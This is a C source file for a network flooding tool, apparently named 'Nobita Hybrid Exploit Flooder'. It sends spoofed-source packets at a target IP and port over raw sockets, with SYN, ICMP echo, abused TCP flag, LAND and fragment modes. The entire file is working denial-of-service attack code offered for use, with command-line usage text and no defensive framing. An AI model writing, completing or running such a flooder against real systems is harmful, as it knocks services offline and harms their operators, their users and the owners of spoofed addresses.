// nobita_flooder.c – Created by Nobita God 😎
// Modes: hybrid, syn, icmp, flagabuse, land, frag
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>

#define PACKET_SIZE 4096

// TCP checksum calc
unsigned short checksum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while(nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if(nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;

    return(answer);
}

// Create IP header
struct ipheader {
    unsigned char  iph_ihl:4, iph_ver:4;
    unsigned char  iph_tos;
    unsigned short iph_len;
    unsigned short iph_ident;
    unsigned short iph_offset;
    unsigned char  iph_ttl;
    unsigned char  iph_protocol;
    unsigned short iph_chksum;
    unsigned int   iph_source;
    unsigned int   iph_dest;
};

// Create pseudo header for TCP checksum
struct pseudo_tcp {
    unsigned int src_addr;
    unsigned int dst_addr;
    unsigned char zero;
    unsigned char protocol;
    unsigned short length;
};

void random_ip(char *ip) {
    sprintf(ip, "%d.%d.%d.%d", rand() % 255, rand() % 255, rand() % 255, rand() % 255);
}

void flood(const char *target, int port, int duration, const char *mode) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Raw socket error");
        exit(1);
    }

    int one = 1;
    const int *val = &one;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(target);

    char packet[PACKET_SIZE];

    time_t start = time(NULL);

    while ((time(NULL) - start) < duration) {
        memset(packet, 0, PACKET_SIZE);

        struct ipheader *ip = (struct ipheader *) packet;
        struct tcphdr *tcp = (struct tcphdr *) (packet + sizeof(struct ipheader));
        struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof(struct ipheader));

        char spoof_ip[16];
        random_ip(spoof_ip);
        ip->iph_ver = 4;
        ip->iph_ihl = 5;
        ip->iph_tos = 0;
        ip->iph_len = htons(sizeof(struct ipheader) + 20);  // IP + TCP or ICMP
        ip->iph_ident = htons(rand() % 65535);
        ip->iph_offset = 0;
        ip->iph_ttl = 64;
        ip->iph_protocol = (strcmp(mode, "icmp") == 0) ? IPPROTO_ICMP : IPPROTO_TCP;
        ip->iph_source = inet_addr(spoof_ip);
        ip->iph_dest = sin.sin_addr.s_addr;
        ip->iph_chksum = checksum((unsigned short *)packet, sizeof(struct ipheader));

        if (strcmp(mode, "icmp") == 0 || strcmp(mode, "hybrid") == 0) {
            // ICMP
            icmp->type = ICMP_ECHO;
            icmp->code = 0;
            icmp->un.echo.id = rand() % 65535;
            icmp->un.echo.sequence = rand() % 65535;
            icmp->checksum = checksum((unsigned short *)icmp, sizeof(struct icmphdr));
        }

        if (strcmp(mode, "syn") == 0 || strcmp(mode, "hybrid") == 0 ||
            strcmp(mode, "flagabuse") == 0 || strcmp(mode, "land") == 0) {
            // TCP
            tcp->source = htons(rand() % 65535);
            tcp->dest = htons(port);
            tcp->seq = rand();
            tcp->ack_seq = 0;
            tcp->doff = 5;

            if (strcmp(mode, "syn") == 0 || strcmp(mode, "hybrid") == 0) {
                tcp->syn = 1;
            } else if (strcmp(mode, "flagabuse") == 0) {
                tcp->psh = 1;
                tcp->urg = 1;
                tcp->fin = 1;
            } else if (strcmp(mode, "land") == 0) {
                ip->iph_source = ip->iph_dest;
                tcp->source = htons(port);
            }

            tcp->window = htons(5840);
            tcp->check = 0;
            tcp->urg_ptr = 0;

            struct pseudo_tcp psh;
            psh.src_addr = ip->iph_source;
            psh.dst_addr = ip->iph_dest;
            psh.zero = 0;
            psh.protocol = IPPROTO_TCP;
            psh.length = htons(sizeof(struct tcphdr));

            char pseudo_packet[sizeof(struct pseudo_tcp) + sizeof(struct tcphdr)];
            memcpy(pseudo_packet, &psh, sizeof(struct pseudo_tcp));
            memcpy(pseudo_packet + sizeof(struct pseudo_tcp), tcp, sizeof(struct tcphdr));

            tcp->check = checksum((unsigned short *)pseudo_packet, sizeof(pseudo_packet));
        }

        if (strcmp(mode, "frag") == 0) {
            ip->iph_offset = htons(0x2000);  // MF flag
        }

        sendto(sock, packet, ntohs(ip->iph_len), 0, (struct sockaddr *)&sin, sizeof(sin));
    }

    close(sock);
}

int main(int argc, char *argv[]) {
    if (getuid() != 0) {
        printf("[!] Run this as root!\n");
        return 1;
    }

    if (argc < 5) {
        printf("Usage: %s <target IP> <port> <duration> <mode>\n", argv[0]);
        printf("Modes: hybrid | syn | icmp | flagabuse | land | frag\n");
        return 1;
    }

    const char *target = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    const char *mode = argv[4];

    printf("🔥 Starting Nobita Hybrid Exploit Flooder\n");
    printf("🎯 Target: %s | Port: %d | Duration: %ds | Mode: %s\n", target, port, duration, mode);
    flood(target, port, duration, mode);

    printf("✅ Attack finished.\n");
    return 0;
}
